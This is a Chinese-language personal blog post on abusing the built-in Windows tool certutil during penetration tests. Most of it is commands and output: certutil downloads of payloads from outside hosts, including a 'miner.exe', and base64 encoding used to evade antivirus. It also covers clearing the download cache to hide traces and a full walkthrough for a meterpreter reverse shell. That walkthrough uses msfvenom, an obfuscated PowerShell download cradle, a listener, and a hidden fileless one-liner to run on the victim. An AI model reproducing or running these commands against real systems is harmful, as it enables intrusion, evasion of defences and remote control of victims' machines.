+++
title = 'Certutil在渗透中的使用'

description = "虽然不是很厉害但至少开始写了"

tags = [ "技术" ]

date = 2024-11-14T16:06:31+08:00

+++

CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。



经典用法是处理Base64编码的数据：

```
C:\Windows\Temp> certutil.exe -decode input.txt output.exe
//-decode参数用于将编码的文件解码为其原始的二进制形式
//第一二个必选参数分别为输入文件名、输出文件名
```

也能够从远程URL下载证书或者任何其它文件

语法： “certutil.exe -urlcache -split -f [URL] output.file”

```
certutil.exe -urlcache -split -f http://37.44.212.223/miner.exe C:/Windows/temp/yete.exe
```

`-f` 覆盖现有文件。有值的命令行选项。后面跟要下载的文件 url。•`-split` 保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。•`-URLCache` 显示或删除URL缓存条目。无值的命令行选项。（certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）

**两种功能进行结合：首先对恶意文件进行base64编码，以绕过AV检测， 然后在使用CertUtil.exe下载后再对其进行解码。**

```
C:\Windows\Temp>certutil.exe -urlcache -split -f "https://hackers.home/badcontent.txt" bad.txt
C:\Windows\Temp>certutil.exe -decode bad.txt bad.exe
```

攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。



使用Certutil.exe下载文件，下载完成以后一定记得delete 清理痕迹。

```
C:\> certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log
C:\> certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log delete
```

还可以用来校验hash值，这个之前使用过

```
certutil -hashfile mimikatz.exe MD5    //检验MD5certutil -hashfile mimikatz.exe SHA1 //检验SHA1certutil -hashfile mimikatz.exe SHA256 //检验SHA256
```

**Certutil命令配合PS反弹后门**

PowerShell 混淆框架：https://github.com/danielbohannon/Invoke-CradleCrafter

1.在加载PowerShell脚本之前，先来进行数字签名，运行命令。

```
PS C:\Invoke-CradleCrafter> Set-ExecutionPolicy Bypass
执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略? Y
```

2.使用方法，执行两条命令，加载框架。

```
PS C:\Invoke-CradleCrafter> Import-Module .\Invoke-CradleCrafter.ps1
PS C:\Invoke-CradleCrafter> Invoke-CradleCrafter

Invoke-CradleCrafter

          _____                 _                    ,
          \_   \_ ____   _____ | | _____           /(  __________
           / /\/ '_ \ \ / / _ \| |/ / _ \_____    |  >:==========`
        /\/ /_ | | | \ V / (_) |   <  __/_____|    )(
        \____/ |_| |_|\_/ \___/|_|\_\___|          ""
           ___              _ _        ___           __ _
          / __\ __ __ _  __| | | ___  / __\ __ __ _ / _| |_ ___ _ __
         / / | '__/ _` |/ _` | |/ _ \/ / | '__/ _` | |_| __/ _ \ '__|
        / /__| | | (_| | (_| | |  __/ /__| | | (_| |  _| ||  __/ |
        \____/_|  \__,_|\__,_|_|\___\____/_|  \__,_|_|  \__\___|_|

        Tool    :: Invoke-CradleCrafter
        Author  :: Daniel Bohannon (DBO)
        Twitter :: @danielhbohannon
        Blog    :: http://danielbohannon.com
        Github  :: https://github.com/danielbohannon/Invoke-CradleCrafter
        Version :: 1.1
        License :: Apache License, Version 2.0
        Notes   :: If(!$Caffeinated) {Exit}

HELP MENU :: Available options shown below:
```

3.MSF攻击主机，生成payload，并将生成好的payload放入网站根目录，保证能够正常访问。

```
[root@localhost ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp \
> lhost=192.168.1.30 lport=8888 -e cmd/powershell_base64 \
> -f psh -o lyshark.txt

[root@localhost ~]# cp -a lyshark.txt  /var/www/html/
[root@localhost ~]# systemctl restart httpd
```

4.powershell 框架设置指定好的URL链接。

```
Invoke-CradleCrafter>  set URL http://lyshark.com/lyshark.txt

Successfully set Url:
http://lyshark.com/lyshark.txt
```

5.分别执行以下命令完成初始化，这里如果报错请添加环境变量。

```
Invoke-CradleCrafter> MEMORY

Choose one of the below Memory options:

[*] MEMORY\PSWEBSTRING          PS Net.WebClient + DownloadString method
[*] MEMORY\PSWEBDATA            PS Net.WebClient + DownloadData method
[*] MEMORY\PSWEBOPENREAD        PS Net.WebClient + OpenRead method
[*] MEMORY\NETWEBSTRING         .NET [Net.WebClient] + DownloadString method (PS3.0+)
[*] MEMORY\NETWEBDATA           .NET [Net.WebClient] + DownloadData method (PS3.0+)
[*] MEMORY\NETWEBOPENREAD       .NET [Net.WebClient] + OpenRead method (PS3.0+)
[*] MEMORY\PSWEBREQUEST         PS Invoke-WebRequest/IWR (PS3.0+)
[*] MEMORY\PSRESTMETHOD         PS Invoke-RestMethod/IRM (PS3.0+)
[*] MEMORY\NETWEBREQUEST        .NET [Net.HttpWebRequest] class
[*] MEMORY\PSSENDKEYS           PS SendKeys class + Notepad (for the lulz)
[*] MEMORY\PSCOMWORD            PS COM object + WinWord.exe
[*] MEMORY\PSCOMEXCEL           PS COM object + Excel.exe
[*] MEMORY\PSCOMIE              PS COM object + Iexplore.exe
[*] MEMORY\PSCOMMSXML           PS COM object + MsXml2.ServerXmlHttp
[*] MEMORY\PSINLINECSHARP       PS Add-Type + Inline CSharp
[*] MEMORY\PSCOMPILEDCSHARP     .NET [Reflection.Assembly]::Load Pre-Compiled CSharp
[*] MEMORY\CERTUTIL             Certutil.exe + -ping Argument
```

```
Invoke-CradleCrafter\Memory> CERTUTIL

[*] Name          :: Certutil
[*] Description   :: PowerShell leveraging certutil.exe to download payload as string
[*] Compatibility :: PS 2.0+
[*] Dependencies  :: Certutil.exe
[*] Footprint     :: Entirely memory-based
[*] Indicators    :: powershell.exe spawns certutil.exe certutil.exe 
[*] Artifacts     :: C:\Windows\Prefetch\CERTUTIL.EXE-********.pf AppCompat Cache
```

```
Invoke-CradleCrafter\Memory\Certutil> ALL


Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)


Invoke-CradleCrafter\Memory\Certutil\All> 1

Executed:
  CLI:  Memory\Certutil\All\1
  FULL: Out-Cradle -Url 'http://lyshark.com/lyshark.txt' -Cradle 17 -TokenArray @('All',1)

Result:
SV 1O6 'http://lyshark.com/lyshark.txt';.(Get-Command *ke-*pr*) ((C:\Windows\System32\certutil /ping (Get-Item Variable:\1O6).Value|&(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike'*and'}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike'*Com*e'}).Name).Invoke('*el*-O*',$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2|&(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike'*and'}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike'*Com*e'}).Name).Invoke('*el*-O*',$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-SkipLa 1)-Join"`r`n")

Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
```

6.将上方混淆后的内容保存为 crt.txt 然后进行encode加密

```
C:\Users\lyshark\Desktop>certutil -encode crt.txt crt.cer

输入长度 = 912
输出长度 = 1310
CertUtil: -encode 命令成功完成。
```

7.将生成的 crt.cer放入服务器的根目录下，保证能够访问，然后运行msfconsole控制台，并侦听事件。

```
[root@localhost ~]# cp -a crt.cer /var/www/html/

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.1.30
lhost => 192.168.1.7
msf5 exploit(multi/handler) > set lport 8888
lport => 8888
msf5 exploit(multi/handler) > exploit -j -z
```

8.最终靶机执行，以下命令。

```
powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\crt.cer (New‐Object Net.WebClient).DownloadString('http://lyshark.com/crt.cer'); certutil ‐decode %APPDATA%\crt.cer %APPDATA%\stage.ps1 & start /b c
md /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\crt.cer
```

这种情况下powershell脚本不会落地

没想到一个校验证书的程序能有这么多的功能...

*参考：*

[干货 | Certutil在渗透中的利用和详解](https://cloud.tencent.com/developer/article/1850744)

[certutil 命令配合PS反弹后门]((https://www.cnblogs.com/LyShark/p/10994300.html))

[攻击者利用CertUtil.exe植入恶意软件](https://wsygoogol.github.io/2018/12/17/%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8CertUtil-exe%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/)
